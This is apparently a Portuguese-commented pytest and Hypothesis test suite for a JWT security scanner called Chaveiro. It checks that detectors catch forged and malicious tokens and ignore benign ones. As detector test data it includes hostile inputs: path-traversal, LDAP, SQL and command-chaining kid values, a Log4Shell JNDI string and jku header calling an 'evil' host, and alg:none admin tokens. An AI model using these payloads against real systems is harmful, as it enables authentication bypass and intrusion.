"""Invariantes das correções da auditoria cruzada de FP/FN do Chaveiro (2026-08-28/29).

Cada teste ataca a CLASSE. Para uma tool de SEGURANÇA, o falso NEGATIVO (deixar passar um
kid-injection percent-encoded, uma assinatura vazia, um alg:none aninhado) é tão grave quanto
o falso positivo — ambos aqui.
"""

from __future__ import annotations

import json

import jwt as pyjwt  # PyJWT: oraculo independente de parsing/emissao de tokens
import pytest
from hypothesis import HealthCheck, assume, given, settings
from hypothesis import strategies as st

from chaveiro.checks.detectors import _is_sensitive_key, run_all
from chaveiro.core.jwt import b64url_encode, decode
from tests.conftest import hs_token, raw_token

NOW = 1_800_000_000


def _ids(token: str, now: int = NOW) -> set[str]:
    return {f.check_id for f in run_all(decode(token), now)}


# ---------------------- FP: kid legítimo não é injeção ----------------------
def test_kid_base64_url_e_hierarquico_nao_sao_injecao() -> None:
    for kid in ("abc/def+gh=", "https://issuer.example/keys/2024", "ns/subsystem/key-1"):
        assert "header-kid-injection" not in _ids(hs_token({"sub": "a"}, kid=kid))


def test_es256k_e_algoritmo_conhecido() -> None:
    assert "alg-unknown" not in _ids(raw_token({"alg": "ES256K"}, {"sub": "a"}))


def test_refresh_token_keycloak_nao_e_vida_longa() -> None:
    tok = hs_token({"exp": NOW + 30 * 24 * 3600, "iat": NOW}, typ="Refresh")
    assert "claim-long-lifetime" not in _ids(tok)


def test_claims_de_metadata_de_senha_nao_sao_segredo() -> None:
    payload = {
        "pwd_exp": NOW + 999,
        "password_changed_at": NOW - 10,
        "has_password": True,
        "pwdLastSet": NOW - 100,
        "pwd_url": "https://portal/troca-senha",
        "password_policy": {"min": 8},
    }
    assert "payload-sensitive" not in _ids(hs_token(payload))


def test_segredo_em_claro_ainda_e_pego() -> None:  # contraprova
    assert "payload-sensitive" in _ids(hs_token({"client_secret": "s3cr3t-real-value"}))


# ---------------------- FN: injeção de kid em todas as formas ----------------------
def test_kid_injection_percent_encoded_ldap_sqli_e_chaining() -> None:
    for kid in ("%2e%2e%2fetc%2fpasswd", "*)(uid=*", "x' OR 1=1", "a && whoami", "../../secret"):
        assert "header-kid-injection" in _ids(hs_token({"sub": "a"}, kid=kid)), kid


# ---------------------- FN: alg:none normalizado (zero-width) ----------------------
def test_alg_none_com_zero_width_space() -> None:
    assert "alg-none" in _ids(raw_token({"alg": "none​"}, {"sub": "a"}))


def test_homoglifo_cirilico_nao_e_alg_none() -> None:  # contraprova: não é bypass real
    assert "alg-none" not in _ids(raw_token({"alg": "n" + chr(0x43E) + "ne"}, {"sub": "a"}))


# ---------------------- FN: assinatura vazia num algoritmo de assinatura ----------------------
def test_assinatura_vazia_em_rs256_e_hs256() -> None:
    assert "signature-empty" in _ids(raw_token({"alg": "RS256"}, {"sub": "a"}))
    assert "signature-empty" in _ids(raw_token({"alg": "HS256"}, {"sub": "a"}))


# ---------------------- FN: iat no futuro ----------------------
def test_iat_no_futuro() -> None:
    assert "claim-iat-future" in _ids(
        hs_token({"iat": NOW + 5 * 365 * 24 * 3600, "exp": NOW + 5 * 365 * 24 * 3600 + 60})
    )


# ---------------------- FN: Bearer prefix e token multilinha ----------------------
def test_bearer_prefix_e_multilinha() -> None:
    base = raw_token({"alg": "none"}, {"sub": "admin"})
    assert "alg-none" in _ids("Bearer " + base)
    h, p, s = base.split(".")
    assert "alg-none" in _ids(f"{h}.\n{p}.\n{s}")


# ---------------------- FN: header com chave duplicada (parser-differential) ----------------------
def test_header_alg_duplicado_first_wins() -> None:
    h = b64url_encode(b'{"alg":"none","alg":"HS256","typ":"JWT"}')
    p = b64url_encode(b'{"sub":"a"}')
    tok = f"{h}.{p}."
    ids = _ids(tok)
    assert "header-duplicate-key" in ids and "alg-none" in ids


# ---------------------- FN: JWT aninhado com miolo alg:none ----------------------
def test_nested_jwt_com_interno_none() -> None:
    interno = raw_token({"alg": "none"}, {"role": "admin"})
    casca = hs_token({}, cty="JWT")  # payload vazio; forçamos o aninhado abaixo
    h, _, sig = casca.split(".")
    tok = f"{h}.{b64url_encode(interno.encode())}.{sig}"
    ids = _ids(tok)
    assert "payload-nested-jwt" in ids and "alg-none" in ids


# ===================================================================================
# Segunda onda (2026-08-30): buracos que o cetico adversarial provou. Cada teste ataca
# a CLASSE (pertinencia `in`/`not in`, com contraprova do benigno correspondente).
# ===================================================================================


def _wrap(interno_raw: str, **hdr: object) -> str:
    """Casca HS256 cujo payload E o token interno (JWT aninhado real, RFC 7519 §5.2)."""
    casca = hs_token({}, cty="JWT", **hdr)
    h, _, sig = casca.split(".")
    return f"{h}.{b64url_encode(interno_raw.encode())}.{sig}"


# ---------------------- H1: aninhamento auditado RECURSIVAMENTE e por INTEIRO ----------------------
def test_h1_alg_none_no_miolo_a_tres_niveis() -> None:
    # Casca -> casca -> miolo alg:none. Antes so 1 nivel + so check_alg -> invisivel.
    miolo = raw_token({"alg": "none"}, {"role": "admin"})
    assert "alg-none" in _ids(_wrap(_wrap(miolo)))


def test_h1_jku_kid_e_segredo_dentro_do_aninhado() -> None:
    # A bateria COMPLETA roda em cada camada: header (jku/kid) e payload (segredo), nao so alg.
    assert "header-jku" in _ids(
        _wrap(raw_token({"alg": "HS256", "jku": "http://evil/keys"}, {"sub": "a"}))
    )
    assert "header-kid-injection" in _ids(
        _wrap(raw_token({"alg": "HS256", "kid": "../../etc/passwd"}, {"sub": "a"}))
    )
    assert "payload-sensitive" in _ids(
        _wrap(raw_token({"alg": "HS256"}, {"client_secret": "s3cr3t-real-value"}))
    )


def test_h1_aninhamento_nao_entra_em_laco_nem_estoura() -> None:  # contraprova: teto/ciclo
    # Cadeia funda alem do teto termina sem crash e ainda audita as camadas dentro do teto.
    tok = raw_token({"alg": "none"}, {"role": "admin"})
    for _ in range(8):
        tok = _wrap(tok)
    ids = _ids(tok)  # nao deve levantar
    assert "payload-nested-jwt" in ids


# --------- Achado (media): alg:none no MIOLO alem do teto raso de 4 niveis escapava ---------
# NB: o aninhamento REAL cresce ~1,33x por camada (o payload da casca E o token interno em
# base64url), entao uma cadeia funda e exponencialmente grande — o proprio custo em memoria e
# a guarda anti-DoS natural (nem o atacante consegue forjar 500 niveis). Por isso os testes
# ficam em profundidades baratas mas MUITO alem do teto antigo (4).
def _aninha_miolo(camadas: int) -> str:
    """Envolve um miolo alg:none em `camadas` cascas HS256 (aninhamento REAL, RFC 7519 §5.2)."""
    tok = raw_token({"alg": "none"}, {"role": "admin"})
    for _ in range(camadas):
        tok = _wrap(tok)
    return tok


def test_alg_none_no_miolo_e_sinalizado_em_qualquer_profundidade() -> None:
    # Anti-mutação: o scanner tem que ALCANCAR o nucleo. O teto antigo (4) deixava o miolo
    # a 5+ niveis passar batido. Cobrimos 5, 6 e uma cadeia bem mais funda — todas SINALIZAM.
    for camadas in (5, 6, 20):
        ids = _ids(_aninha_miolo(camadas))
        assert "alg-none" in ids, camadas
        assert "payload-nested-jwt" in ids, camadas


def test_aninhamento_legitimo_profundo_nao_gera_falso_positivo() -> None:  # contraprova FP
    # Cadeia funda de cascas HS256 com um miolo LEGITIMO (assinado, com exp/iat/aud/iss) nao pode
    # inventar alg-none so por ser fundo — a descida audita, mas nada de FP.
    miolo = hs_token(
        {"sub": "a", "exp": NOW + 60, "iat": NOW, "aud": "api", "iss": "auth"}, secret="k"
    )
    tok = miolo
    for _ in range(20):
        tok = _wrap(tok)
    assert "alg-none" not in _ids(tok)


def test_guarda_anti_dos_json_hostil_continua_ativa() -> None:  # contraprova: MAX_JSON_DEPTH
    # Descer mais fundo no aninhamento NAO pode enfraquecer a guarda de profundidade JSON
    # (MAX_JSON_DEPTH): um segmento com aninhamento ESTRUTURAL hostil segue rejeitado (fail-closed),
    # e uma camada interna hostil encerra a descida sem crash nem loop.
    from chaveiro.core.jwt import MAX_JSON_DEPTH, JWTError

    fundo = "{" * (MAX_JSON_DEPTH + 20)  # profundidade JSON alem do teto -> decode rejeita
    h = b64url_encode(b'{"alg":"HS256"}')
    p = b64url_encode(fundo.encode())
    with pytest.raises(JWTError):
        decode(f"{h}.{p}.")
    # a mesma camada hostil aninhada dentro de uma casca: a auditoria termina, sem levantar
    interno_hostil = f"{h}.{p}."
    ids = _ids(_wrap(interno_hostil))  # nao deve levantar
    assert "payload-nested-jwt" in ids  # a casca ainda e sinalizada como aninhada


# ---------------------- H2: kid — unquote ate ponto-fixo + NFKC + metacaracteres ----------------------
def test_h2_kid_double_encoding_el_fullwidth_abspath() -> None:
    perigosos = (
        "%252e%252e%252fetc%252fpasswd",  # double-encoding -> ../etc/passwd
        "app & whoami",  # '&' sozinho (nao so '&&')
        "${jndi:ldap://evil/a}",  # EL / JNDI (Log4Shell)
        chr(0xFF0E) * 2 + chr(0xFF0F),  # fullwidth "../" (U+FF0E/FF0F) colapsa em ../ sob NFKC
        "/etc/passwd",  # caminho absoluto
    )
    for kid in perigosos:
        assert "header-kid-injection" in _ids(hs_token({"sub": "a"}, kid=kid)), kid


def test_h2_kid_legitimo_estavel_sob_fixpoint_e_nfkc_nao_dispara() -> None:  # contraprova
    for kid in (
        "abc/def+gh=",
        "keys/prod/1",
        "a7Bc+/dE9fG0hIjK1LmN2oPq3rS4tUv6wXyZ8A==",
        "https://issuer.example/keys/2024",
        "urn:example:key:2026",
        "2019-05-01",
    ):
        assert "header-kid-injection" not in _ids(hs_token({"sub": "a"}, kid=kid)), kid


# ---------------------- H3: payload-sensitive re-incluido por SINAL do valor ----------------------
def test_h3_segredo_url_numerico_lista_e_chave_metadata() -> None:
    casos = (
        {"notify": "https://hooks.slack.com/services/T00/B00/XXXXXXXXXXXX"},  # webhook Slack
        {"cb": "https://user:p4ss@host/x"},  # userinfo basic-auth
        {"link": "https://b.s3.amazonaws.com/k?X-Amz-Signature=deadbeef"},  # presigned S3
        {"password": 123456},  # segredo numerico
        {"api_keys": ["AKIAIOSFODNN7EXAMPLE"]},  # lista de segredos
        {"api_key_url": "AKIAIOSFODNN7EXAMPLE"},  # segredo sob chave _url (metadata)
    )
    for payload in casos:
        assert "payload-sensitive" in _ids(hs_token(payload)), payload


def test_h3_placeholder_e_policy_numerica_nao_disparam() -> None:  # contraprova
    for payload in (
        {"client_secret": "${CLIENT_SECRET}"},
        {"secret": "<your-secret>"},
        {"api_key": "changeme"},
        {"settings": {"password_expires_days": 90}},
    ):
        assert "payload-sensitive" not in _ids(hs_token(payload)), payload
    # e o segredo real segue pego:
    assert "payload-sensitive" in _ids(hs_token({"client_secret": "s3cr3t-real-value"}))


# ---------------------- H4: signature-empty x alg-none normalizado (zero-width) ----------------------
def test_h4_none_com_zero_width_nao_gera_signature_empty() -> None:
    ids = _ids(raw_token({"alg": "none​"}, {"sub": "a"}))  # raw_token: assinatura vazia
    assert "alg-none" in ids and "signature-empty" not in ids


def test_h4_rs256_com_assinatura_vazia_ainda_e_signature_empty() -> None:  # contraprova
    assert "signature-empty" in _ids(raw_token({"alg": "RS256"}, {"sub": "a"}))


# ---------------------- H5: long-lifetime nao e suprimido por typ:Refresh self-asserted ----------------------
def test_h5_access_longo_com_scope_e_typ_refresh_nao_e_suprimido() -> None:
    tok = hs_token({"exp": NOW + 30 * 24 * 3600, "iat": NOW, "scope": "admin"}, typ="Refresh")
    assert "claim-long-lifetime" in _ids(tok)


def test_h5_refresh_sem_sinais_de_acesso_segue_suprimido() -> None:  # contraprova
    tok = hs_token({"exp": NOW + 30 * 24 * 3600, "iat": NOW}, typ="Refresh")
    assert "claim-long-lifetime" not in _ids(tok)


# ===================================================================================
# Terceira onda (2026-09-08): correcoes P0/P1 do plano de correcao. Property-based
# (Hypothesis) na INVARIANTE + par anti-mutacao, com PyJWT como oraculo onde ajuda.
# ===================================================================================


# ---------------------- P0 (FN): chave duplicada tambem no PAYLOAD ----------------------
# INVARIANTE: para QUALQUER token, se um segmento (cabecalho OU payload) tem chave repetida sob
# first-wins vs last-wins, o achado de parser-differential dispara. Nao pode existir chave repetida
# silenciosa em nenhum dos dois segmentos.
_DUP_KEYS = st.sampled_from(["role", "exp", "aud", "scope", "admin", "sub", "kid", "alg", "iss"])
_DUP_VALS = st.sampled_from(["user", "admin", "1", "0", "true", "false", "a", "b"])


def _seg_com_chave_duplicada(base: dict[str, object], dup_key: str, v1: str, v2: str) -> bytes:
    """Monta o JSON de UM segmento com `dup_key` repetida (dois valores distintos) — um dict
    Python nao consegue expressar isso, entao serializamos os pares a mao."""
    pares = [f"{json.dumps(k)}:{json.dumps(v)}" for k, v in base.items()]
    pares.append(f"{json.dumps(dup_key)}:{json.dumps(v1)}")
    pares.append(f"{json.dumps(dup_key)}:{json.dumps(v2)}")
    return ("{" + ",".join(pares) + "}").encode()


def _token_com_segmento_duplicado(segmento: int, dup_key: str, v1: str, v2: str) -> str:
    header_base: dict[str, object] = {"alg": "HS256", "typ": "JWT"}
    payload_base: dict[str, object] = {"sub": "a"}
    if segmento == 0:
        h = b64url_encode(_seg_com_chave_duplicada(header_base, dup_key, v1, v2))
        p = b64url_encode(json.dumps(payload_base).encode())
    else:
        h = b64url_encode(json.dumps(header_base).encode())
        p = b64url_encode(_seg_com_chave_duplicada(payload_base, dup_key, v1, v2))
    return f"{h}.{p}."


@given(
    segmento=st.sampled_from([0, 1]),
    dup_key=_DUP_KEYS,
    vals=st.lists(_DUP_VALS, min_size=2, max_size=2, unique=True),
)
@settings(max_examples=200)
def test_prop_chave_duplicada_em_qualquer_segmento_dispara(
    segmento: int, dup_key: str, vals: list[str]
) -> None:
    tok = _token_com_segmento_duplicado(segmento, dup_key, vals[0], vals[1])
    esperado = "header-duplicate-key" if segmento == 0 else "payload-duplicate-key"
    assert esperado in _ids(tok), (segmento, dup_key, vals)


def test_p0_role_duplicado_no_payload_dispara_com_oraculo_pyjwt() -> None:
    # Reproduz o achado do plano: {"role":"user","role":"admin"} no payload. PyJWT (que usa a
    # semantica last-wins do json.loads, como a maioria dos verificadores) enxerga role=admin,
    # enquanto um parser first-wins enxerga role=user — o differential e REAL e explorabel.
    h = b64url_encode(b'{"alg":"HS256","typ":"JWT"}')
    p = b64url_encode(b'{"sub":"1","role":"user","role":"admin","exp":9999999999,"iat":1757000000}')
    tok = f"{h}.{p}."
    visto = pyjwt.decode(tok, options={"verify_signature": False})
    assert visto["role"] == "admin"  # oraculo: o verificador ve o valor perigoso
    assert "payload-duplicate-key" in _ids(tok, now=1757000000)


def test_p0_sem_duplicata_nao_dispara() -> None:  # contraprova (trava o outro lado)
    assert "payload-duplicate-key" not in _ids(hs_token({"sub": "1", "role": "admin"}))
    assert "header-duplicate-key" not in _ids(hs_token({"sub": "1"}))


def test_p0_payload_aninhado_nao_gera_duplicate_key_espurio() -> None:  # contraprova: nested JWS
    # Num JWT aninhado o payload E um JWS compacto (nao JSON); nao pode virar achado de duplicata.
    assert "payload-duplicate-key" not in _ids(_wrap(hs_token({"sub": "a"})))


# ---------------------- P1 (FP): chave-descritor de recurso nao e segredo ----------------------
# INVARIANTE: uma chave cuja palavra sensivel e DESCRITOR de recurso (name/type/uid/namespace/
# kind/ref/id de um secret/token/key) descreve metadados — nao dispara payload-sensitive pelo
# contexto-da-chave. O gate de VALOR (assinatura forte) continua valendo sob QUALQUER chave.
_SENS_BASES = st.sampled_from(
    ["secret", "senha", "pwd", "password", "passwd", "apikey", "api_key", "private_key"]
)
_DESCRITORES = st.sampled_from(["name", "type", "uid", "namespace", "kind", "ref", "id"])
_SEPS = st.sampled_from(["_", ".", "/", "-"])
_VALORES_SEM_ASSINATURA = st.sampled_from(
    ["admin-user-token-6gl6l", "default", "my-resource", "Opaque", "kind-secret", "v1", "abc"]
)
# Assinaturas FORTES de credencial: precisam disparar mesmo sob uma chave-descritor.
_VALORES_COM_ASSINATURA = st.sampled_from(
    [
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_" + "A" * 36,
        "xoxb-" + "123456789012-abcdefghijklmnop",
        "sk-" + "B" * 24,
        "https://hooks.slack.com/services/T00/B00/XXXXXXXXXXXXXXXXXXXXXXXX",
    ]
)


@given(base=_SENS_BASES, sep=_SEPS, desc=_DESCRITORES, val=_VALORES_SEM_ASSINATURA)
@settings(max_examples=300, suppress_health_check=[HealthCheck.filter_too_much])
def test_prop_chave_descritor_sem_assinatura_nao_dispara(
    base: str, sep: str, desc: str, val: str
) -> None:
    key = f"{base}{sep}{desc}"
    # Pre-condicao: a chave AINDA e reconhecida como sensivel (senao o teste nao exercita o fix —
    # o ponto e que uma chave-sensivel TERMINADA em descritor deixa de disparar por contexto).
    assume(_is_sensitive_key(key))
    assert "payload-sensitive" not in _ids(hs_token({key: val})), (key, val)


@given(base=_SENS_BASES, sep=_SEPS, desc=_DESCRITORES, val=_VALORES_COM_ASSINATURA)
@settings(max_examples=300)
def test_prop_valor_com_assinatura_dispara_mesmo_sob_chave_descritor(
    base: str, sep: str, desc: str, val: str
) -> None:
    # Trava o OUTRO lado: a supressao por descritor NAO pode cegar um segredo real que apareca sob
    # a chave-descritor. O gate de valor independe da chave.
    key = f"{base}{sep}{desc}"
    assert "payload-sensitive" in _ids(hs_token({key: val})), (key, val)


def test_p1_k8s_serviceaccount_secret_name_e_metadata() -> None:
    # Reproduz o achado do plano: token k8s legacy de ServiceAccount. O valor de '.../secret.name'
    # e o NOME do objeto Secret (metadado), nao a credencial.
    payload = {
        "iss": "kubernetes/serviceaccount",
        "kubernetes.io/serviceaccount/namespace": "default",
        "kubernetes.io/serviceaccount/secret.name": "admin-user-token-6gl6l",
        "kubernetes.io/serviceaccount/service-account.name": "admin-user",
        "kubernetes.io/serviceaccount/service-account.uid": "e8f7c111-2233-4455",
        "sub": "system:serviceaccount:default:admin-user",
    }
    assert "payload-sensitive" not in _ids(hs_token(payload))


def test_p1_segredo_real_sob_chave_descritor_ainda_dispara() -> None:  # contraprova
    assert "payload-sensitive" in _ids(hs_token({"secret_name": "AKIAIOSFODNN7EXAMPLE"}))
    assert "payload-sensitive" in _ids(hs_token({"secret.name": "ghp_" + "A" * 36}))
    # e um segredo sob chave-nucleo NAO-descritor segue pego:
    assert "payload-sensitive" in _ids(hs_token({"client_secret": "s3cr3t-real-value"}))


# ---------------------- P1 (FP): refresh reconhecido por convencao de biblioteca ----------------
# INVARIANTE: a supressao de long-lifetime para refresh token nao depende do NOME do campo — cobre
# 'typ' (Keycloak/custom), 'type' (Flask-JWT-Extended) e 'token_type' (drf-simplejwt), valor
# 'refresh' (case-insensitive) — mantendo o gate anti-abuso 'and not sinais_de_acesso'.
_REFRESH_FIELDS = st.sampled_from(["typ", "type", "token_type"])
_REFRESH_VALS = st.sampled_from(["refresh", "Refresh", "REFRESH", "reFResh", " refresh "])
_SINAIS_ACESSO = st.sampled_from(["scope", "scp", "azp"])
_D30 = 30 * 24 * 3600


@given(field=_REFRESH_FIELDS, val=_REFRESH_VALS)
@settings(max_examples=100)
def test_prop_refresh_por_convencao_suprime_long_lifetime(field: str, val: str) -> None:
    payload = {"exp": NOW + _D30, "iat": NOW, field: val}
    assert "claim-long-lifetime" not in _ids(hs_token(payload)), (field, val)


@given(field=_REFRESH_FIELDS, val=_REFRESH_VALS, acesso=_SINAIS_ACESSO)
@settings(max_examples=100)
def test_prop_refresh_declarado_mas_com_sinal_de_acesso_ainda_dispara(
    field: str, val: str, acesso: str
) -> None:
    # Gate anti-abuso INTOCADO: um access token de 30d com scope/scp/azp nao ganha bypass so por
    # se declarar refresh.
    payload = {"exp": NOW + _D30, "iat": NOW, field: val, acesso: "admin"}
    assert "claim-long-lifetime" in _ids(hs_token(payload)), (field, val, acesso)


def test_p1_refresh_emitido_pelo_pyjwt_e_suprimido() -> None:
    # Oraculo: tokens no formato REAL das libs Python mais comuns, emitidos pelo PyJWT.
    simplejwt = pyjwt.encode(
        {"exp": NOW + _D30, "iat": NOW, "token_type": "refresh", "jti": "x"},
        "k" * 40,
        algorithm="HS256",
    )
    flask_jwt = pyjwt.encode(
        {"exp": NOW + _D30, "iat": NOW, "type": "refresh"}, "k" * 40, algorithm="HS256"
    )
    assert "claim-long-lifetime" not in _ids(simplejwt)
    assert "claim-long-lifetime" not in _ids(flask_jwt)


def test_p1_access_longo_sem_sinal_de_refresh_ainda_dispara() -> None:  # contraprova
    assert "claim-long-lifetime" in _ids(hs_token({"exp": NOW + _D30, "iat": NOW}))
